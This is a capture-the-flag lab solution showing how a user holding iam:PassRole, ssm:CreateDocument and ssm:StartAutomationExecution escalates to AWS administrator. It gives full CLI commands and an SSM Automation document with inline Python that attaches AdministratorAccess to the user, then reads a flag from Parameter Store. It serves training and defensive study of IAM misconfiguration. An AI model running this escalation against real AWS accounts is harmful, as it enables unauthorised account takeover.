# Solution: PassRole + SSM Automation ExecuteScript to Admin

AWS Systems Manager Automation is a powerful orchestration service that runs multi-step runbooks against your AWS environment. Its `aws:executeScript` action type is particularly interesting from a security perspective: it accepts inline Python or PowerShell code and executes it inside AWS-managed serverless compute — no EC2 instance, no SSM agent, no pre-existing Lambda function required. The compute is entirely AWS-managed and ephemeral.

The critical detail is what happens to credentials inside that compute environment. When an automation execution starts, SSM assumes the role specified as `AutomationAssumeRole` and injects that role's credentials into the execution context. Any boto3 client created inside an `aws:executeScript` step automatically inherits those credentials. An attacker who can supply the Python code and choose the `AutomationAssumeRole` effectively runs arbitrary Python as any IAM role they can pass to SSM.

This technique is a classic "new passrole" path: the privilege escalation does not depend on any pre-existing compute resource with a powerful role attached. The attacker brings the code (via `ssm:CreateDocument`) and the role (via `iam:PassRole`). SSM provides the compute. The minimum permission tuple — `iam:PassRole`, `ssm:CreateDocument`, `ssm:StartAutomationExecution` — is small enough to appear in legitimate infrastructure automation grants, making this path easy to introduce accidentally and difficult to notice in a routine IAM review.

## The Challenge

You have obtained credentials for `pl-prod-ssm-003-to-admin-starting-user` — an IAM user that looks like it was provisioned for infrastructure automation. The permissions are narrow: the user can pass a specific IAM role to SSM, create SSM documents, and start automation executions. Nothing that screams "privilege escalation" at first glance.

Your goal is to reach full administrator access to the AWS account and capture the CTF flag from SSM Parameter Store. Start by confirming your current identity and that you cannot yet read the flag:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
# {"UserId": "...", "Account": "...", "Arn": "arn:aws:iam::{account_id}:user/pl-prod-ssm-003-to-admin-starting-user"}

aws ssm get-parameter --name /pathfinding-labs/flags/ssm-003-to-admin --with-decryption
# AccessDeniedException — no ssm:GetParameter yet
```

Good. You are confirmed as the starting user and confirmed blocked from the flag.

## Reconnaissance

With `iam:ListRoles` and `iam:GetRole` available, your first move is to survey IAM roles that trust `ssm.amazonaws.com`. These are the candidates for `AutomationAssumeRole` — any one of them could be passed into an automation execution:

```bash
aws iam list-roles \
  --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.Service==`ssm.amazonaws.com`]].{Name:RoleName,Arn:Arn}' \
  --output table
```

You should see `pl-prod-ssm-003-to-admin-automation-role` in the output. Inspect its trust policy and attached policies to confirm it holds `AdministratorAccess`:

```bash
aws iam get-role --role-name pl-prod-ssm-003-to-admin-automation-role \
  --query 'Role.AssumeRolePolicyDocument'

aws iam list-attached-role-policies --role-name pl-prod-ssm-003-to-admin-automation-role
```

The trust policy grants `sts:AssumeRole` to `ssm.amazonaws.com`, and the attached policies include `AdministratorAccess`. This role can be assumed by SSM Automation, and it holds full admin authority. The PassRole scope on your starting user policy points directly at this role's ARN, confirming it is the intended AutomationAssumeRole for this scenario.

You now know the complete picture: you hold `iam:PassRole` on an admin role that trusts SSM, plus the two permissions needed to create and start an automation. The path is clear.

## Exploitation

SSM Automation documents use schema version `0.3` and define a sequence of steps under `mainSteps`. The `aws:executeScript` action accepts inline Python code under `inputs.Script` and receives a dictionary of parameters via `inputs.InputPayload`. The Python function specified as `inputs.Handler` is called with that payload as its first argument.

Start by writing the document content to a temporary file. The script calls `iam:AttachUserPolicy` using a boto3 IAM client — which automatically inherits the `AutomationAssumeRole`'s credentials — and attaches `AdministratorAccess` to the target username supplied as a parameter:

```bash
cat > /tmp/ssm-003-doc.json << 'EOF'
{
  "schemaVersion": "0.3",
  "description": "Escalate IAM user via aws:executeScript under AutomationAssumeRole",
  "assumeRole": "{{ AutomationAssumeRole }}",
  "parameters": {
    "AutomationAssumeRole": {
      "type": "String",
      "description": "IAM role ARN for Automation to assume"
    },
    "UserName": {
      "type": "String",
      "description": "IAM user name to escalate"
    }
  },
  "mainSteps": [
    {
      "name": "escalateUser",
      "action": "aws:executeScript",
      "inputs": {
        "Runtime": "python3.11",
        "Handler": "script_handler",
        "InputPayload": {
          "UserName": "{{ UserName }}"
        },
        "Script": "import boto3\ndef script_handler(events, context):\n    iam = boto3.client('iam')\n    iam.attach_user_policy(UserName=events['UserName'], PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')\n    return {'Status': 'Escalated ' + events['UserName']}\n"
      }
    }
  ]
}
EOF
```

Register the document using your starting user credentials:

```bash
aws ssm create-document \
  --name pl-escalation-ssm-003 \
  --content file:///tmp/ssm-003-doc.json \
  --document-type Automation \
  --document-format JSON
```

You should receive a response containing `"Status": "Creating"` confirming the document was accepted. Now start the execution, passing the admin role as `AutomationAssumeRole` and your own username as the escalation target. This call is where SSM performs the `iam:PassRole` check — verifying that your starting user can pass the specified role to `ssm.amazonaws.com`:

```bash
aws ssm start-automation-execution \
  --document-name pl-escalation-ssm-003 \
  --parameters '{
    "AutomationAssumeRole": ["arn:aws:iam::{account_id}:role/pl-prod-ssm-003-to-admin-automation-role"],
    "UserName": ["pl-prod-ssm-003-to-admin-starting-user"]
  }'
```

The response is an `AutomationExecutionId`. Save it. SSM has now assumed the admin role and is running your Python function inside AWS-managed compute. The boto3 IAM client in the script calls `iam.attach_user_policy(...)` under the admin role's credentials, and SSM reports success within a few seconds.

If you have the helpful `ssm:GetAutomationExecution` permission, you can poll for completion:

```bash
aws ssm get-automation-execution \
  --automation-execution-id <execution-id> \
  --query 'AutomationExecution.{Status:AutomationExecutionStatus,Failure:FailureMessage}'
```

Wait for `"Status": "Success"`. Then give IAM 15 seconds to propagate the newly attached policy:

```bash
sleep 15
```

## Verification

Your original starting user credentials — the same access key and secret key you started the session with — now carry `AdministratorAccess`. No `sts:AssumeRole` call is needed. Verify:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-ssm-003-to-admin-starting-user
# Should show AdministratorAccess in the list

aws iam list-users --max-items 3 --output table
# Succeeds — you now have full read access to IAM
```

You have achieved administrator access using your original credentials.

## Capture the Flag

Every Pathfinding Labs `to-admin` scenario stores the CTF flag as a SecureString in AWS Systems Manager Parameter Store at `/pathfinding-labs/flags/<scenario-id>`. Reading it requires `ssm:GetParameter` on that specific parameter, which `AdministratorAccess` provides implicitly.

Using your original starting user credentials (no role assumption needed — the policy is attached directly to the user), retrieve the flag:

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/ssm-003-to-admin \
  --with-decryption \
  --query 'Parameter.Value' \
  --output text
```

The value returned is the flag for this scenario. Its exact contents are deployment-specific — the same command works as the final step for any `to-admin` scenario, with only the path segment changing. The `--with-decryption` flag is required because the parameter is stored as a `SecureString`; without it you would receive the KMS-encrypted ciphertext.

## What Happened

You started with three permissions that individually appear routine for anyone involved in infrastructure automation: the ability to pass a specific role to SSM, the ability to create SSM documents, and the ability to start SSM Automation executions. Combined, they form a complete privilege escalation path that requires no additional infrastructure.

The attack exploited SSM Automation's `aws:executeScript` action, which runs attacker-supplied Python in AWS-managed compute under the credentials of the `AutomationAssumeRole`. Because the role held `AdministratorAccess`, the script could call any IAM action — including attaching `AdministratorAccess` back to the starting user. After the execution, the original user credentials gained full admin authority without ever assuming a role directly.

This pattern appears in real environments when teams grant `ssm:CreateDocument` and `ssm:StartAutomationExecution` broadly for operational automation purposes and separately provision a powerful SSM-trusted role for those runbooks. The `iam:PassRole` restriction looks like it limits blast radius — but if the passable role is admin-equivalent and trusted by SSM, the effective blast radius is full account compromise for anyone holding that PassRole grant.
